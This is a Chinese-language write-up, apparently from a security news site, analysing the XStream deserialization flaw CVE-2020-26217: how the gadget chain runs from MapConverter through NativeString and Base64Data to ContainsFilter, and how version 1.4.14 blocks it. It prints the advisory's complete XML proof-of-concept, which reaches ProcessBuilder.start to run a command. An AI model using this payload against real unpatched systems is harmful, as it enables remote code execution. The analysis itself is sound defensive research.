# XStream反序列化CVE-2020-26217漏洞分析

阅读量 **235009**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-11-19 10:00:14

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t016873a7a1a77c95e6.jpg)

## 引言

近期，XStream发布了关于[CVE-2020-26217](https://x-stream.github.io/CVE-2020-26217.html)的公告，通过该漏洞攻击者可发送恶意构造的xml，在受影响版本(<=1.4.13)的XStream上直接RCE。

## XStream反序列化原理

与传统的Java反序列化不同，XStream反序列化的触发不依靠`readObject`，而是使用`Converter`(转换器)中的`unmarshal`。而Converter根据源码的注释，其用途为对象与xml文本之间的相互转换。

![](https://p2.ssl.qhimg.com/t016d70a29c3a767189.png)

下面用一个简单的例子来演示，首先我们定义一个`User`类

    
    
    public class User {
        public String username;
    }
    

然后使用XStream加载

    
    
    XStream xStream = new XStream();
    User user = (User)xStream.fromXML(new File("/Users/dinfinite/IdeaProjects/xstream/src/main/resources/payloads/user.xml"));
    

由于User类并未在`Converter`的转换类型中，因此使用`ReflectionConverter`进行`unmarshal`，该转换器判断能否转换的逻辑如下，即类存在且可访问

![](https://p3.ssl.qhimg.com/t011952a933b75a3e37.png)

调用`unmarshal`将xml还原为`User`对象，完成反序列化的过程

![](https://p0.ssl.qhimg.com/t0138cca60d7a3e081d.png)

## XStream历史漏洞

在XStream过往的漏洞中，利用的核心为`DynamicProxy`类和`EventHandler`类，当存在`dynamic-proxy`标签时，会使用`DynamicProxyConverter`进行`unmarshal`，该操作会构造一个由用户指定`handler`的对应代理对象。

![](https://p3.ssl.qhimg.com/t0160de92a200a2137a.png)

而恰好`EventHandler`的`invoke`函数支持执行任意方法(根据传入的参数)

![](https://p2.ssl.qhimg.com/t0198f65363a1ee182f.png)

![](https://p3.ssl.qhimg.com/t0147cd3389065c6bba.png)

因此XStream官方的修复方式为,实现了一个类为`InternalBlackList`(黑名单转换器),当属性值为`java.beans.EventHandler`时，抛出异常，因此基于该类型的poc均失效

![](https://p0.ssl.qhimg.com/t015c8e54cb78830f15.png)

## 漏洞复现

以下为官方公告中给出的POC

    
    
    <map>
        <entry>
            <jdk.nashorn.internal.objects.NativeString>
                <flags>0</flags>
                <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                    <dataHandler>
                        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                            <contentType>text/plain</contentType>
                            <is class='java.io.SequenceInputStream'>
                                <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                                    <iterator class='javax.imageio.spi.FilterIterator'>
                                        <iter class='java.util.ArrayList$Itr'>
                                            <cursor>0</cursor>
                                            <lastRet>-1</lastRet>
                                            <expectedModCount>1</expectedModCount>
                                            <outer-class>
                                                <java.lang.ProcessBuilder>
                                                    <command>
                                                        <string>open</string>
                                                        <string>./</string>
                                                    </command>
                                                </java.lang.ProcessBuilder>
                                            </outer-class>
                                        </iter>
                                        <filter class='javax.imageio.ImageIO$ContainsFilter'>
                                            <method>
                                                <class>java.lang.ProcessBuilder</class>
                                                <name>start</name>
                                                <parameter-types/>
                                            </method>
                                            <name>start</name>
                                        </filter>
                                        <next/>
                                    </iterator>
                                    <type>KEYS</type>
                                </e>
                                <in class='java.io.ByteArrayInputStream'>
                                    <buf></buf>
                                    <pos>0</pos>
                                    <mark>0</mark>
                                    <count>0</count>
                                </in>
                            </is>
                            <consumed>false</consumed>
                        </dataSource>
                        <transferFlavors/>
                    </dataHandler>
                    <dataLen>0</dataLen>
                </value>
            </jdk.nashorn.internal.objects.NativeString>
            <string>test</string>
        </entry>
    </map>
    

通过XStream加载上述XML，成功弹出计算器

![](https://p0.ssl.qhimg.com/t0117e5f715308f03ac.png)

## 漏洞分析

由于该漏洞触发链较长，为了便于理解，将整体的利用链分成四部分。

![](https://p2.ssl.qhimg.com/t01873f8ed3a4980bb0.png)

###  入口

由于`DynamicProxy`类和`EventHandler`类的组合拳失效，因此这次漏洞并没有利用动态代理转换器，漏洞的触发点在`MapConverter`中，其`unmarshal`函数如下

![](https://p5.ssl.qhimg.com/t015ddedc644731da56.png)

可以看到，传入的XML文本(转换为reader)，被传递到了填充map的函数中，进一步跟进，流程走到了`putCurrentEntryIntoMap`函数中，该函数的作用为将对应的key和value(从XML中解析，对应POC中的`<jdk.nashorn.internal.objects.NativeString>`和`<string>`)放到HashMap中，由此触发HashMap的`put`方法，进入纽带1阶段

###  纽带1

由于在Java中HashMap需要计算HashCode，因此作为key的`jdk.nashorn.internal.objects.NativeString`，会调用其`hashCode`方法

![](https://p0.ssl.qhimg.com/t01ecdddd49dd928bc6.png)

###  纽带2

由于`jdk.nashorn.internal.objects.NativeString`的`hashCode`会先调用`getStringValue()`，它调用当前类的属性`value`的`toString`方法,由于`value`为`com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data`类，它的`toString`会触发自身的`get`函数

![](https://p1.ssl.qhimg.com/t018c4c70b5ac73a28c.png)

`get`函数调用`readForm`读取自身的`DataSource`中的`InputStream`

###  终点方法

在读取的过程中，会遍历`InputStream`中的子元素

![](https://p1.ssl.qhimg.com/t017ccef4f515a80b22.png)

而`javax.swing.MultiUIDefaultsEnumerator`类的`nextElement`，会调用自身迭代器的`next`函数，其`next`函数中额外调用了`advance`函数

![](https://p0.ssl.qhimg.com/t01d3043a84550fd40c.png)

`advance`函数额外调用了`filter`属性的`filter`方法

![](https://p2.ssl.qhimg.com/t01d7a321e67095fb09.png)

`javax.imageio.ContainsFilter`类的`filter`方法如下

![](https://p1.ssl.qhimg.com/t01aa80d5baa72d94ac.png)

可以看到，只要`method`以及`elt`可控，即可执行任意类任意方法，实现RCE。而`method`和`elt`在先前的`ReflectionConverter`中，已经填充完毕，对应POC中的`<filter>`和`<iter>`元素。

## 漏洞修复

其实官方早在`1.4.7`的时候，就加入了针对XStream自身的安全框架

![](https://p0.ssl.qhimg.com/t0100b0e93bcd480722.png)

然而框架本身并未提供任何默认策略，需要用户手动调用`addPermission`进行配置，因此，在`1.4.13`之前的版本，其防御手段都是依靠修改`Converter`，包括`InternalBlackList`和`ReflectionConverter`，在转换时将其拦截。在`1.4.13`中，默认加入了`EventHandler`的黑名单

![](https://p2.ssl.qhimg.com/t015572560c56b8d479.png)

在`1.4.14`中，加入了`java.lang.ProcessBuilder`和`javax.imageio.ImageIO$ContainsFilter`的黑名单

![](https://p2.ssl.qhimg.com/t0158b435028b5d1795.png)

当我们在`1.4.14`中再次执行POC时，会发现抛出了`ForbiddenClassException`异常。

![](https://p2.ssl.qhimg.com/t013563435d2ecf54c2.png)

跟踪其调用栈，发现`SecurityMapper`会存取到`Converter`当中，当`Converter`试图获取标签的类时，会先遍历自身的`Mapper`(其中包括`SecurityMapper`)

![](https://p2.ssl.qhimg.com/t013b7da640cbfd032a.png)

此时假设匹配到黑名单类，直接抛出异常。

![](https://p2.ssl.qhimg.com/t015027de1271ab12b2.png)

![](https://p5.ssl.qhimg.com/t0104978799565aa1d1.png)

## 参考链接

[Java
XStream反序列化漏洞](https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D_infinite** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/222830](/post/id/222830)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [Java](/tag/Java)
  * [XStream](/tag/XStream)

 **+1** __2赞

 __收藏

![](https://p2.ssl.qhimg.com/t01fef30e40d37bd4a2.png) D_infinite

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

